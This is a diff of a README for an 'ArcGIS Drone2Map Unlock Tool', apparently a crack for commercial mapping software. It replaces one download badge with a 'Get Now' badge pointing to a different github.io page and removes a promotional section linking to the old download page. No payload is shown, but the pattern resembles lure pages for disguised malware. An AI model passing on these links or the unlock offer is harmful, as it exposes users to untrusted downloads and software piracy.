@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ ArcGIS Drone2Map Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://arcgis-drone2map-free-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20ArcGIS%20Drone2Map%20Unlock%20Tool-Enable%20All%20Features-1E4D2B?style=for-the-badge&logo=esri&logoColor=white" 
-         alt="Download ArcGIS Drone2Map Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://sidhikteberh.github.io/.github/arcgis-drone2map)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -90,13 +85,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.
-
----
-
-## ⭐ Unlock ArcGIS Drone2Map – Professional Drone Mapping
-
-Enable all premium ArcGIS Drone2Map features including orthomosaic creation, 3D meshes, elevation modeling, and ArcGIS integration.  
-[Download the Unlock Tool](https://arcgis-drone2map-free-download.github.io/.github/) and process drone imagery like a pro.
 
 ---
 
